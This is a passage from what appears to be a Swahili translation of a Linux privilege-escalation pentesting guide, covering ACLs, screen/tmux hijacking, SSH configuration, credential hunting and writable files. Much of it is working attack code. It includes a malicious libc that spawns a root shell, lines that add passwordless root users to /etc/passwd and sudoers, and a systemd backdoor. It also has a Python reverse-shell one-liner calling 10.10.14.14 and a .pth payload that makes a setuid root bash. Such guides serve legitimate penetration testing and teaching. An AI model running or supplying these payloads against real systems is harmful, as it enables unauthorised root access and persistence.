Kisha unda maktaba hasidi ndani ya `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Uwezo

Linux capabilities hutoa **sehemu ndogo ya haki za root zinazopatikana kwa mchakato**. Kwa ufanisi, hii hugawa **haki za root katika vitengo vidogo na tofauti**. Kila kimoja cha vitengo hivi kinaweza kupewa michakato kivyake. Kwa njia hii, seti kamili ya haki hupunguzwa, na hivyo kupunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu capabilities na jinsi ya kuzitumia vibaya**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Ruhusa za saraka

Katika saraka, **biti ya "execute"** ina maana kwamba mtumiaji anayehusika anaweza kutumia "**cd**" kuingia kwenye folda.\
Biti ya **"read"** ina maana kwamba mtumiaji anaweza **kuorodhesha** **faili**, na biti ya **"write"** ina maana kwamba mtumiaji anaweza **kufuta** na **kuunda** **faili** mpya.

## ACLs

Access Control Lists (ACLs) ni safu ya pili ya ruhusa za hiari, zinazoweza **kubatilisha ruhusa za kawaida za ugo/rwx**. Ruhusa hizi huongeza udhibiti wa ufikiaji wa faili au saraka kwa kuruhusu au kukataa haki kwa watumiaji mahususi ambao si wamiliki au sehemu ya kikundi. Kiwango hiki cha **undani huhakikisha usimamizi sahihi zaidi wa ufikiaji**. Maelezo zaidi yanapatikana [**hapa**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Mpe** mtumiaji "kali" ruhusa za kusoma na kuandika faili:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Pata** faili zenye ACL maalum kutoka kwenye mfumo:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Backdoor ya ACL iliyofichwa kwenye faili za ziada za sudoers

Usanidi usio sahihi unaotokea mara nyingi ni faili inayomilikiwa na root ndani ya `/etc/sudoers.d/` yenye mode `440`, ambayo bado inampa mtumiaji mwenye haki za chini ruhusa ya kuandika kupitia ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Ukiona kitu kama `user:alice:rw-`, mtumiaji anaweza kuongeza kanuni ya sudo licha ya biti za hali zenye vizuizi:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Hii ni njia ya persistence/privesc yenye athari kubwa kwa ACL kwa sababu ni rahisi kuikosa katika ukaguzi unaotegemea `ls -l` pekee.

## Vipindi vya shell vilivyo wazi

Ufikiaji wa GNU Screen wa watumiaji tofauti hutegemea **usanidi na ACL za kipindi kinachoendeshwa**, si toleo lake pekee. [GNU Screen inaeleza](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) kwamba lazima ijengwe ikiwa na usaidizi wa watumiaji wengi; `multiuser on` na ruhusa ya `acladd` au `aclchg` inayofaa humruhusu mtumiaji mwingine kujiunga. [Mwongozo pia unahitaji setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) ili kutafuta kipindi cha watumiaji tofauti. Socket inayoonekana inayomilikiwa na root au binary ya SUID `screen` pekee haithibitishi kuwa kuna shell ya root inayoweza kuunganishwa. Thibitisha kuwa kipindi kinachoendeshwa kina hali ya watumiaji wengi, mtumiaji wa sasa ana ruhusa faafu ya kuingiza amri/kutekeleza amri, na shell katika kipindi hicho inaendeshwa na mmiliki mwenye mapendeleo kabla ya kukichukulia kama njia ya kupata mapendeleo ya juu.

### Utekaji wa vipindi vya screen

**Orodhesha vipindi vya screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![Kutekwa kwa session za screen - Mahali pa socket (baadhi ya mifumo huonyesha moja kama symlink ya nyingine): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Ambatisha kwenye session**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Hili lilikuwa tatizo katika **matoleo ya zamani ya tmux**. Sikuweza kuhijack session ya tmux (v2.1) iliyoundwa na root nikiwa mtumiaji asiye na ruhusa za juu.

**Orodhesha sessions za tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Maeneo ya socket (baadhi ya mifumo huonyesha moja kama symlink ya nyingine) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Orodhesha kwa kutumia socket hiyo; unaweza kuanzisha tmux session kwenye socket hiyo...](<../../images/image (837).png>)

**Ambatisha kwenye session**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Angalia **Valentine box kutoka HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Keys zilizozalishwa kwa builds za OpenSSL za Debian zilizoathiriwa au derivatives zake katika kipindi cha kihistoria cha udhaifu zinaweza kuwa na randomness inayotabirika; distro ya sasa ya host au toleo la OpenSSL lililopatiwa patch halithibitishi jinsi key ya zamani ilivyotengenezwa. Kagua **key mahususi** dhidi ya orodha inayofaa ya kihistoria ya keys zilizozuiwa na chunguza asili yake. Mwongozo wa Debian wa [`ssh-vulnkey`](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) unaeleza jinsi ya kukagua public keys na `authorized_keys`, na [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) inaeleza marekebisho ya OpenSSL. Ingizo katika `authorized_keys` ya akaunti yenye mamlaka ni kidokezo cha escalation tu ikiwa private key inayolingana inaweza kupatikana na sera ya SSH inayotumika bado inakubali key hiyo kwa akaunti hiyo; **host key** dhaifu yenyewe si kitambulisho cha kuingia. Badilisha keys zilizoathiriwa na uondoe ruhusa zake za zamani.

### Thamani za kuvutia za usanidi wa SSH

- **PasswordAuthentication:** Hubainisha kama uthibitishaji kwa password unaruhusiwa. Chaguo-msingi la upstream OpenSSH ni `yes`; usanidi wa distro unaweza kulibadilisha.
- **PubkeyAuthentication:** Hubainisha kama uthibitishaji kwa public key unaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati uthibitishaji kwa password unaruhusiwa, hubainisha kama server inaruhusu kuingia kwenye akaunti zenye password string tupu. Chaguo-msingi ni `no`.

### Faili za kudhibiti kuingia

Faili hizi huathiri nani anaweza kuingia na jinsi anavyoingia:

- **`/etc/nologin`**: ikiwa ipo, huzuia kuingia kwa wasio-root na kuonyesha ujumbe wake.
- **`/etc/securetty`**: huzuia mahali ambapo root anaweza kuingia (orodha ya TTY zinazoruhusiwa).
- **`/etc/motd`**: bango linaloonyeshwa baada ya kuingia (linaweza kuvuja maelezo ya mazingira au matengenezo).

### PermitRootLogin

Hubainisha kama root anaweza kuingia kwa kutumia ssh. Chaguo-msingi la upstream OpenSSH ni `prohibit-password`; usanidi wa distro unaweza kulibadilisha. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia password na private key
- `without-password` au `prohibit-password`: root anaweza kuingia kwa kutumia private key pekee
- `forced-commands-only`: Root anaweza kuingia kwa kutumia private key pekee, na ikiwa chaguo za commands zimebainishwa
- `no` : hapana

### Mamlaka za cheti cha mtumiaji cha SSH zinazoaminika

`TrustedUserCAKeys` hubainisha public keys ambazo sshd inaziamini kusaini vyeti vya **mtumiaji**. Ikiwa private CA key inayolingana inaweza kusomwa na mtumiaji mwenye mamlaka ya chini, kagua nani anaweza kupata cheti na ni principals zipi za akaunti kinachoweza kuthibitisha. `AuthorizedPrincipalsFile` au `AuthorizedPrincipalsCommand` zinaweza kuzuia majina yanayokubaliwa; ikiwa hakuna iliyosanidiwa, cheti lazima kiwe na jina la akaunti lengwa. `PermitRootLogin prohibit-password` huzuia uthibitishaji wa root kwa password, lakini bado inaweza kuruhusu uthibitishaji kwa cheti. Njia ya key iliyo wazi pekee haithibitishi ufikiaji: thibitisha jozi ya public/private key, sheria za `Match` zinazotumika, sera ya akaunti, key passphrase, revocation, na signature algorithms zinazokubaliwa. Usijumuishe private-key bytes kwenye matokeo ya enumeration. Tazama [mwongozo wa usanidi wa server ya OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Private CA key inaweza pia kutumika **bila kusomeka** na mtumiaji wa sasa ikiwa sheria ya kukabidhi mamlaka inamruhusu mtumiaji huyo kutumia certificate signer isiyo na vizuizi [kama `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) chini ya utambulisho wa mmiliki wa key. Linganisha command na arguments halisi zinazoruhusiwa na ufikiaji wa akaunti ya signer kwa key, CA public key inayoaminika na usanidi wa sshd unaotumika, principal inayokubaliwa kwa akaunti lengwa, uhalali wa cheti, na sera ya kuingia ya akaunti hiyo. Command ya signer iliyokabidhiwa au faili ya CA inayoaminika pekee havithibitishi ufikiaji wa akaunti nyingine; usisaini cheti cha majaribio wakati wa passive enumeration.

Kwa njia tofauti ya uaminifu wa CA kwa kila akaunti, tazama [SSH certificate principal delimiter confusion](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion).

### AuthorizedKeysFile

Hubainisha faili zilizo na public keys zinazoweza kutumiwa kwa uthibitishaji wa mtumiaji. Inaweza kuwa na tokens kama `%h`, zitakazobadilishwa na home directory. **Unaweza kubainisha absolute paths** (zinazoanza na `/`) au **relative paths kutoka home directory ya mtumiaji**. Kwa mfano:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Usanidi huo utaonyesha kwamba ukijaribu kuingia kwa kutumia ufunguo **faragha** wa mtumiaji "**testusername**", ssh italilinganisha ufunguo wa umma wa ufunguo wako na zile zilizo kwenye `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding hukuruhusu **kutumia funguo zako za SSH za ndani badala ya kuacha funguo** (bila passphrases!) kwenye server yako. Kwa hivyo, utaweza **kuruka** kupitia ssh **kwenda kwenye host** na kutoka hapo **kuruka kwenda kwenye host nyingine** **ukitumia** **ufunguo** ulio kwenye **host yako ya mwanzo**.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama hivi:

```
Host example.com
  ForwardAgent yes
```

Angalia kwamba ikiwa `Host` ni `*`, kila mara mtumiaji anapohamia kwenye mashine nyingine, mashine hiyo itaweza kufikia funguo (jambo ambalo ni hatari kiusalama).

Faili `/etc/ssh_config` inaweza **kubatilisha** **chaguo** hizi na kuruhusu au kuzuia usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataza** usambazaji wa ssh-agent kwa kutumia neno kuu `AllowAgentForwarding` (kwa chaguo-msingi huruhusiwa).

Ukigundua kuwa Forward Agent imesanidiwa katika mazingira fulani, soma ukurasa ufuatao kwa kuwa **huenda ukaweza kuitumia vibaya ili kuongeza ruhusa**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Faili za Kuvutia

### Faili za profile

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **scripts zinazotekelezwa mtumiaji anapoanzisha shell mpya**. Kwa hiyo, ukiweza **kuandika au kurekebisha mojawapo ya faili hizo, unaweza kuongeza ruhusa**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Ikiwa utapata script yoyote isiyo ya kawaida ya profile, unapaswa kuikagua ili kuona kama ina **taarifa nyeti**.

### Faili za Passwd/Shadow

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa na majina tofauti au kunaweza kuwa na nakala za ziada. Kwa hivyo, inashauriwa **kuzitafuta zote** na **kuangalia kama unaweza kuzisoma** ili kuona **kama zina hashes**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au faili inayolingana nayo)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Faili ya /etc/passwd inayoweza kuandikwa

Kwanza, tengeneza nenosiri kwa kutumia mojawapo ya amri zifuatazo.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Kisha ongeza mtumiaji `hacker` na uweke nenosiri lililotengenezwa.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` pamoja na `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji bandia bila nenosiri.\
ONYO: unaweza kupunguza usalama wa sasa wa mashine.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

KUMBUKA: Katika mifumo ya BSD, `/etc/passwd` hupatikana kwenye `/etc/pwd.db` na `/etc/master.passwd`; pia, `/etc/shadow` hubadilishwa jina na kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika kwenye baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika kwenye **faili ya usanidi wa huduma**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **kurekebisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kurekebisha mistari:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Backdoor yako itatekelezwa wakati ujao tomcat itakapoanzishwa.

### Angalia Folda

Folda zifuatazo zinaweza kuwa na nakala rudufu au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hutaweza kusoma ya mwisho, lakini jaribu)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Maeneo Yasiyo ya Kawaida/Mafaili Yanayomilikiwa

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Faili zilizorekebishwa katika dakika za hivi karibuni

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Faili za DB za SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Kwa hifadhidata za programu zinazosomeka, kagua majina ya jedwali na safu wima ili kupata majina ya watumiaji na password hashes. Kupata hash, kurejesha nenosiri lake, na kuthibitisha kuwa limetumika tena kwa akaunti ya ndani ni hatua tofauti; mfuatano wowote wa herufi za hexadecimal wenye urefu wa herufi 32 hautoshi kuhitimisha kuwa ni MD5 au kwamba unaweza kufikia akaunti.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Ikiwa historia ya shell inayosomeka ina amri ya `sudo` ikifuatiwa na mstari mfupi unaofanana na nenosiri, kagua mwenyewe mistari inayozunguka. Nenosiri lililoingizwa kwenye prompt ya kawaida ya `sudo` halihifadhiwi kwenye historia ya shell; mstari unaofuata ni ingizo linalowezekana lililoingizwa kwenye shell kimakosa, si uthibitisho wa nenosiri sahihi. Alama ya `.sudo_as_admin_successful` hurekodi matumizi ya awali, si ruhusa ya sasa.

### Faili zilizofichwa

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Skripti/Faili za binary katika PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Faili za wavuti**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Nakala rudufu**

Kagua faili zinazosomeka ndani ya saraka za nakala rudufu, pamoja na faili ambazo **majina** yake yana `backup`: jalada lenye jina lisiloeleweka au kiendelezi kilichosimbwa kwa njia fiche bado linaweza kufichua data ya zamani ya programu. Jalada lililosimbwa kwa njia fiche ni uwezekano tu wa kufichuka. Kurejesha password, kukagua yaliyomo, kurejesha hash ya programu, na kutumia tena password hiyo kwa akaunti ya Unix ni hatua tofauti zinazopaswa kuthibitishwa; hash iliyo kwenye jalada haithibitishi login ya ndani.

Nakala rudufu za mashine pepe zinazosomeka zinahitaji ukaguzi huohuo. Usanidi wa VirtualBox `.vbox` unaweza kutambua picha za `.vdi` zilizounganishwa na kuwa na metadata ya ufunguo wa diski uliosimbwa kwa njia fiche; [VirtualBox inaeleza kuwa ufunguo wa data uliosimbwa huhifadhiwa kwenye usanidi wa VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Usanidi na picha lazima vyote viweze kufikiwa ili ukaguzi wa diski nje ya mfumo uwezekane. Kiasi cha data cha guest kinaweza kuwa na [tabaka lake la usimbaji fiche la LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), linalohitaji ufunguo tofauti. Hata baada ya kusimbua kwa njia fiche kwa idhini, hati za zamani au usanidi unaweza kuwa na password; thibitisha kuwa kitambulisho hicho bado kinatumika kwa akaunti ya host na kwamba sera yake ya `sudo` inayotumika inaruhusu amri yenye haki za juu kabla ya kuita hili local escalation. Orodhesha paths na ruhusa bila kunakili, kusimbua kwa njia fiche, au kuunganisha picha wakati wa enumeration tulivu.

Unapokagua jalada linalosomeka, orodhesha majina ya vipengee vyake kabla ya kutoa chochote: huenda kukawa na faili fiche za uthibitishaji, maelezo ya recovery code, au funguo za SSH hata kama nakala zake zinazotumika zimekingwa. Majina ya faili yanaonyesha kidokezo tu; thibitisha maelezo hayo na matumizi tena ya akaunti kando.

Tanguliza **majalada yanayosomeka yanayomilikiwa na mtumiaji mwingine** ndani ya saraka za nakala rudufu, hasa majalada yanayomilikiwa na root na yale yanayofikika kupitia uanachama wa kundi. Jalada la zamani linaweza kuwa na usanidi au siri ya uthibitishaji hata kama nakala inayotumika imekingwa. Kwa UI ya ndani ya nakala rudufu kama [Backrest](https://garethgeorge.github.io/backrest/), kagua akaunti halisi ya huduma na kama mtumiaji mwenye haki za chini anaweza kusoma usanidi wake au kuingia kwenye UI. [Hooks](https://garethgeorge.github.io/backrest/docs/hooks) zake na [kiolesura cha amri cha restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) vinaweza kutumia haki za faili na amri za daemon; listener ya loopback pekee haiamui athari. `passwordBcrypt` ya Backrest ni hash ya bcrypt iliyosimbwa kwa base64 katika [msimbo wake wa uthibitishaji](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), si password ya maandishi ya kawaida. Thibitisha utambulisho wa huduma, vitambulisho vinavyoweza kutumika, na ufikiaji wa plan au repository husika kabla ya kuchukulia jalada au UI iliyofichuka kuwa mpaka wa haki.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Faili zinazojulikana kuwa na nywila

Soma code ya [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), hutafuta **faili kadhaa zinazoweza kuwa na nywila**.\
**Zana nyingine ya kuvutia** unayoweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), programu ya open source inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux na Mac.

Ikiwa unaweza kusoma `/etc/guacamole/guacamole.properties`, kagua mipangilio yake ya muunganisho wa database ya `mysql-*`, `postgresql-*`, au `sqlserver-*`. Ikiwa akaunti imeidhinishwa kusoma majedwali ya Guacamole JDBC, `guacamole_connection_parameter` inaweza kuwa na thamani zilizohifadhiwa za SSH za `username`, `password`, `private-key`, au `passphrase`. Anza na connection IDs na majina ya vigezo, kisha kagua safu husika pekee; thamani iliyohifadhiwa inaweza kuwa token inayobadilika au rejeleo la vault badala ya siri inayoweza kutumika tena. Tazama [schema ya Guacamole JDBC](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) na [vigezo vya muunganisho wa SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

Kidhibiti cha nywila cha [pswm](https://github.com/Julynx/pswm#usage) huhifadhi vault iliyosimbwa kwa njia fiche kwenye `~/.local/share/pswm/pswm` kwa chaguo-msingi. Ikiwa vault ya mtumiaji mwingine inaonekana, kagua umiliki wake na iwapo akaunti yako inaweza kuisoma kweli. Njia ya vault pekee haifichui taarifa za kuingia; kurejesha nywila kuu, kupata nywila ya akaunti inayoweza kutumika tena, na kuthibitisha ruhusa za akaunti hiyo ni hatua tofauti.

[Database ya chaguo-msingi ya Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) ni `~/.passpie/`, ikiwa na keyring ya `.keys` na faili za taarifa za kuingia za `.pass` zilizosimbwa kwa njia fiche ndani ya saraka za makundi. Saraka ya database inayoonekana ni kidokezo cha njia pekee: thibitisha ufikiaji wa ufunguo na ingizo husika lililosimbwa kwa njia fiche, passphrase yoyote kuu inayohitajika, na iwapo taarifa za kuingia zilizopatikana ni za akaunti yenye ruhusa za juu zaidi. Passpie pia inaruhusu [njia maalum za database](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), kwa hivyo njia ya chaguo-msingi haijumuishi kila uwezekano. Uhesabuji wa kiotomatiki unapaswa kuorodhesha metadata bila kuhamisha taarifa za kuingia au kuchapisha maudhui ya ufunguo.

### Logs

Ikiwa unaweza kusoma logs, unaweza kupata **taarifa za kuvutia/siri ndani yake**. Kadiri log ilivyo ya ajabu, ndivyo inavyoweza kuvutia zaidi (pengine).\
Pia, baadhi ya **audit logs** zilizosanidiwa "**vibaya**" (zilizowekwa backdoor?) zinaweza kukuruhusu **kurekodi nywila** ndani ya audit logs, kama ilivyoelezwa kwenye chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Ili **kusoma log**, kundi [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) litakuwa na manufaa sana.

### Faili za shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Utafutaji wa Jumla wa Creds/Regex

Unapaswa pia kutafuta faili zenye neno "**password**" kwenye **jina** lake au ndani ya **maudhui** yake, na pia utafute IP na barua pepe ndani ya logi, au regex za hash.\
Sitaorodhesha hapa jinsi ya kufanya haya yote, lakini ikiwa ungependa, unaweza kuangalia ukaguzi wa mwisho unaofanywa na [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Faili Zinazoweza Kuandikwa

### Python library hijacking

Ikiwa unajua **mahali** script ya python itakapotekelezwa na **unaweza kuandika ndani ya** folda hiyo au unaweza **kurekebisha python libraries**, unaweza kurekebisha OS library na kuiwekea backdoor (ikiwa unaweza kuandika kwenye folda ambamo script ya python itatekelezwa, nakili na ubandike library ya os.py).

Ili **kuwekea library backdoor**, ongeza tu mstari ufuatao mwishoni mwa library ya os.py (badilisha IP na PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `.pth` inayochakatwa na `site.addsitedir()` katika directory inayoweza kuandikwa

Usichukulie `site.addsitedir(DIR)` kuwa sawa na `sys.path.append(DIR)`. Pia huchakata kila faili ya `*.pth` iliyo katika `DIR`. Mstari unaoanza na `import` ikifuatiwa na nafasi au tab hutekelezwa kama msimbo wa Python. Mistari ya path hutatuliwa ikilinganishwa na directory ya site na kuongezwa ikiwa tu zipo.<sup>[[38]](#references)</sup>

Hili huwa privilege escalation wakati programu ya Python inayoruhusiwa na sudo au yenye marupurupu kwa njia nyingine inapopiga `site.addsitedir()` kwenye directory inayoweza kuandikwa na mtumiaji wa sasa au mojawapo ya makundi yake. Msimbo wa `.pth` hutekelezwa programu hiyo yenye marupurupu inapoweka njia yake ya import, kabla ya kusambaza kitendo chake cha kawaida.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Maudhui yanayoweza kutekelezwa ya `.pth` lazima yawe kwenye mstari mmoja, lakini semicolon huruhusu kauli kadhaa. Kwa mfano, njia ya utekelezaji ya root inaweza kuunda nakala ya Bash ya setuid; iendeshe Bash kwa `-p` ili ihifadhi effective ID yake.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

Chaguo la `-S` huzima tu uanzishaji wa kiotomatiki wa `site` katika Python. Halimlindi programu inayoingiza `site` waziwazi na kuita `site.addsitedir()`. Ondoa saraka zinazoweza kuandikwa na mshambuliaji kwenye njia za import zenye ruhusa za juu, na hakikisha kuwa saraka na faili zake za `.pth` zinamilikiwa na kuandikiwa na msimamizi mwenye ruhusa za juu pekee.<sup>[[38]](#references)[[39]](#references)</sup>

### Udukuzi wa logrotate

